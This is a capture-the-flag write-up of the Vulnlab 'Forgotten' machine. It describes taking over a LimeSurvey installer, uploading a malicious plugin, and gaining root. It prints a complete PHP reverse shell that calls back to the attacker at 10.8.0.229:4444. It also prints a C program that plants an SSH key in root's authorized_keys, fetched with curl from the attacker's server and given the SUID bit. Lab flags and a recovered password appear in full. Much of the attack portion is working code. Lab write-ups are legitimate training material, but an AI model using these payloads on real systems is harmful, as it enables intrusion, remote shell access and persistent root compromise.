
#Forgotten Box Vulnlab
First of all, we need to do a Nmap scan `sudo nmap -sSCV -Pn 10.10.65.89 -vv --reason -oA top1000` and I am going to save this and run a full TCP and full udp scan. This is so we do not miss out on any services.


From the Nmap scan, we see there is port 80 opened. I am going to check what is being served on the webserver.

Error Message from website Error 404 Unauthorized Access.

The Next command I am going to run is ffuf From the error message received on the http://10.10.70.232/ we see the web technology used apache.
I know the file extension is going to be .php. 

This is the command used to run a recursive fuzz.

```
ffuf -w '/usr/share/wfuzz/wordlist/general/common.txt':FUZZ -u http://10.10.70.232/FUZZ -recursion -recursion-depth 1 -e .php -v
```

From the recursive fuzz, we keep getting redirected to `http://10.10.70.232/survey/index.php?r=installer/` which is an installation page for LIMESURVEY.

We go through the installation at this point we see the scan is complete and we only have two ports open [port 80/22]

Moving on we are asked to install LImeSurvery. I will do a quick Google on what LimeSurvery does and if there is an exploit floating about.

`LimeSurvey version 6.3.7` there doesnt seem to be an exploit https://www.exploit-db.com/search?q=LimeSurvey.

We can try to connect back to our machine 10.8.0.229:3306 and give our login credentials for the Mysql Server.


I had to allow connections from outside `sudo nano /etc/mysql/mariadb.conf.d/50-server.cnf`

changed the bind address to 0.0.0.0 from 127.0.0.1.

I also added a new user called forgotten and a password forgotten to allow us to connect from the Limesurvey.

`GRANT ALL PRIVILEGES ON *.* TO 'forgotten'@'10.10.121.235' IDENTIFIED BY 'forgotten' WITH GRANT OPTION;`

after the set up I was redirected to the login page using `admin:password` to login to the application.

After logging in to the application I did some snooping around to find command injection. I found this GitHub repo helpful https://github.com/Y1LD1R1M-1337/Limesurvey-RCE

I tried uploading the basic 

Config.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<config>
    <metadata>
        <name>mansk</name>
        <type>plugin</type>
        <creationDate>2020-03-20</creationDate>
        <lastUpdate>2020-03-31</lastUpdate>
        <author>Y1LD1R1M</author>
        <authorUrl>https://github.com/Y1LD1R1M-1337</authorUrl>
        <supportUrl>https://github.com/Y1LD1R1M-1337</supportUrl>
        <version>6.0</version>
        <license>GNU General Public License version 2 or later</license>
        <description>
		<![CDATA[Author : mansk]]></description>
    </metadata>

    <compatibility>
        <version>3.0</version>
        <version>4.0</version>
        <version>5.0</version>
        <version>6.3.7</version>
    </compatibility>
    <updaters disabled="disabled"></updaters>
</config>
```
reverse.php
```
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.8.0.229';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;


if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}


chdir("/");

umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 




```
I get ready to catch a shell with pwncat-cs `pwncat-cs -p 4444`

use `ctrl + D` to interact with the remote host

# Enumeration

doing some basic enumeration on the box before trying out linpeas.

The commands I ran for situational Awareness are
`id`
```
id
uid=2000(limesvc) gid=2000(limesvc) groups=2000(limesvc)
```
`cat /etc/os-release`
`echo $PATH`
`env` we got limesvc password here : 5W5HN4K4GCXf9E `LIMESURVEY_PASS=5W5HN4K4GCXf9E`
`sudo -l` Password Needed we try the password found in the env
`uname -a`
`lscpu`
`cat /etc/shells`
`cat /etc/passwd`
`cat /etc/passwd | cut -f1 -d:`
`grep "*sh$" /etc/passwd`
`df -h`
`find / -type d -name ".*" -ls 2>/dev/null`

We can try logging in using ssh `ssh limesvc@10.10.121.235` and the password `5W5HN4K4GCXf9E`

we find the first flag `VL{426b3b0a542f3aa48}` in user.txt.

# Priviledge escalation.
sudo version is 1.9.9 `https://www.exploit-db.com/exploits/51217`


on the initial we got from the website, we can run root.

we need to add the code below into a `key.c` file.

generate your key using `ssh-keygen -t rsa` and give a passphrase copy of the pub key using `cat /home/kali/.ssh/id_rsa.pub` and add to the ssh-rsa bit in the key.c before compiling.

```
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

int main()
{
    const char *sshPublicKey = "ssh-rsa AAAAB3NzaC1yc2EAAAgQDNme9f296S9wXm2EfbJ5MkdlvxIz7k3l0NRWe+8z+nDEx/u1ibt0dS+KQb/VJOusfN3ATIZQu9CRiRrNJ/ZtWR1vKvZPmjA2cqfkuZHLcvN+wUmAHP2wRPSGbyVdQHuX4LMsvJYRiESbHQqy+dL7mgOP6CtMe4bxHFf7P4yFMJwSuhfry0vEYvAscVuZ3KGgmS9zVKiAmf0Yo0GQ/YQgn74+VUbgu+B5cG2+G1qH6yeSMdeSPFX9A3IHxCiR+JnyOReHyW1bcoGdsPpTE92jjsyYd8TSikE9Hv7TFi6Hsxya+ePgxFSUXgp+9hFmnVkrPK84EbMx5dXjVdQgTQd3Hpjg/JKf1txEpMnXGVrNlgyLtY6Hop0rx20/IIqsqC8R59zNquvLTedwhHsRkVx0p2u+ONIXzo9vwaw5DYUpyyghY8PWJen0aB9Ft6XmA2YMutmfKspnhdbxzfSaSmGOdGxAS4DwIoC8nff5sEPppvhScDjM= forgot@forgotten";
    const char *sshDirectory = "/root/.ssh";
    const char *authorizedKeysPath = "/root/.ssh/authorized_keys";

    if (geteuid() != 0)
    {
        perror("[x] Error: Program not running as root.\n");
        return 1;
    }

    printf("[+] Running as root!\n");

    if (mkdir(sshDirectory, 0700) != 0)
    {
        perror("[x] Error creating directory. Skipping...\n");
    }

    FILE *file = fopen(authorizedKeysPath, "a");

    if (file == NULL)
    {
        perror("[x] Error opening file\n");
        return 1;
    }

    if (fprintf(file, "%s\n", sshPublicKey) < 0)
    {
        perror("[x] Error writing to file\n");
        fclose(file);
        return 1;
    }

    fclose(file);

    printf("[+] SSH public key successfully added to %s\n", authorizedKeysPath);

    return 0;
}

```
use GCC to compile `gcc key.c -o key`

upload the compiled file to the box using: start a python http server using
`python3 -m http.server 80`

on the box navigate to `cd /var/www/html/survey` 

`curl -L http://10.8.0.229/key --output key`

`chown root key`
`chmod u+s key`
`chmod +x key`

on the second ssh login navigate to `/opt/limesurvey`
run the `./key` file
```
[+] Running as root!
[x] Error creating directory. Skipping...
: File exists
[+] SSH public key successfully added to /root/.ssh/authorized_keys
```

open another SSH connection and log in as root.
```
ssh root@10.10.121.235       
Enter passphrase for key '/home/kali/.ssh/id_rsa': 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-1012-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Dec 31 04:31:06 UTC 2023

  System load:  0.0               Processes:                150
  Usage of /:   39.0% of 7.57GB   Users logged in:          1
  Memory usage: 37%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   0%                IPv4 address for ens5:    10.10.121.235


Expanded Security Maintenance for Applications is not enabled.

76 updates can be applied immediately.
48 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@ip-10-10-200-233:~# ls
root.txt  snap
root@ip-10-10-200-233:~# cat root.txt 
VL{d75a070fbff631
```


VL{d75a070fbff9aea5d0a1a}


